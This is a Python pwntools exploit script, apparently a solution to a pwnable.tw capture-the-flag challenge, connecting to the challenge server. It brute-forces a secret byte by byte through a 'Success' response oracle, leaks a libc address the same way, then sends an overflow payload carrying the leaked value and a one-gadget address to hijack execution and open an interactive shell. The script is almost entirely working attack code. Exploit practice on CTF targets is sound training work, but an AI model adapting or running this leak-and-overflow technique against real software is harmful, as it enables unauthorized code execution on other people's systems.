#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal

from pwn import *

#context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file = ("./pwn")
elf = ELF(pwn_file)
libc = ELF("./bc.so.6")

if len(sys.argv) == 1:
    r = process(pwn_file)
    pid = r.pid
else:
    r = remote("chall.pwnable.tw", 10205)
    pid = 0

def debug():
    gdb.attach(r, "brva 0x000000000000F78")

canary = ""
for i in range(0x10):
    for ch in range(1, 256):
        if ch == 10:
            continue
        if ch == 255:
            print "error"
            pause()
        r.sendafter(">> ", '1')
        r.sendlineafter(" :", canary + chr(ch))

        if "Success" in r.recvline():
            canary += chr(ch)
            info("canary: " + canary)
            r.sendafter(">> ", '1')
            break

r.sendafter(">> ", '1')
r.sendafter(" :", 'a'*0x48)
r.sendafter(">> ", '1')
r.sendafter(" :", '\n')
r.sendafter(">> ", '3')
r.sendafter(" :", 'a')


r.sendafter(">> ", '1')
a = ""
for i in range(6):
    for ch in range(1, 256):
        if ch == 10:
            continue
        if ch == 255:
            print "error"
            pause()
        r.sendafter(">> ", '1')
        r.sendlineafter(" :", 'a'*8 + a + chr(ch))

        if "Success" in r.recvline():
            a += chr(ch)
            info("libc: " + a)
            r.sendafter(">> ", '1')
            break

a = u64(a + '\x00\x00') - 0x78439
libc.address = a
info("a: " + hex(a))

sh = 'a'*0x40
sh += canary
sh += 'a'*0x18
sh += p64(a + 0xf0567)

r.sendafter(">> ", '1')
r.sendlineafter(" :", sh)
r.sendafter(">> ", '1')
r.sendafter(" :", '\n')
r.sendafter(">> ", '3')
r.sendafter(" :", 'a')

r.sendafter(">> ", '2')


r.interactive()
